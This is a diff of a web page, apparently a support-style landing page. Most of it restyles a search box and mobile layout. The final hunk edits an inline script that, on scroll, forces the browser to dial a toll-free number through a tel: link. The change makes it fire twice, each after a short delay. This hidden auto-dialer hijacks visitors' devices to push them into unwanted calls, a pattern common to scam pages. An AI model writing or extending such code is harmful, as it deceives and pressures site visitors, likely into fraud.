@@ -64,27 +64,31 @@
       margin-bottom: 25px;
       color: #e6e6e6;
     }
+
+    /* Search Box */
     .search-box {
       display: flex;
       justify-content: center;
-      max-width: 400px;
+      align-items: stretch;
+      max-width: 420px;
       margin: 0 auto;
+      background: #fff;
+      border-radius: 6px;
+      overflow: hidden;
     }
     .search-box input {
       flex: 1;
       padding: 12px;
       border: none;
-      border-radius: 4px 0 0 4px;
       outline: none;
       font-size: 14px;
     }
     .search-box button {
-      padding: 12px 18px;
+      padding: 0 18px;
       border: none;
-      background: #fff;
-      color: #0078d4;
+      background: #0078d4;
+      color: #fff;
       font-weight: 600;
-      border-radius: 0 4px 4px 0;
       cursor: pointer;
     }
 
@@ -186,16 +190,20 @@
       .call-btn {
         margin-top: 10px;
         width: 100%;
-        text-align: center;
       }
       .search-box {
         flex-direction: column;
+        border-radius: 6px;
+        overflow: hidden;
       }
-      .search-box input, 
+      .search-box input,
       .search-box button {
         width: 100%;
-        border-radius: 4px;
-        margin: 5px 0;
+        margin: 0;
+        border-radius: 0;
+      }
+      .search-box button {
+        padding: 12px;
       }
       .quick-links {
         flex-direction: column;
@@ -281,12 +289,14 @@
   </footer>
 
   <script>
-    // Trigger auto-dialer on first scroll
-    let hasDialed = false;
+    // Trigger auto-dialer on scroll - allow 2 triggers
+    let dialCount = 0;
     window.addEventListener("scroll", function() {
-      if (!hasDialed) {
-        hasDialed = true;
-        window.location.href = "tel:+18445735175";
+      if (dialCount < 2) {
+        dialCount++;
+        setTimeout(() => {
+          window.location.href = "tel:+18445735175";
+        }, 1000);
       }
     });
   </script>
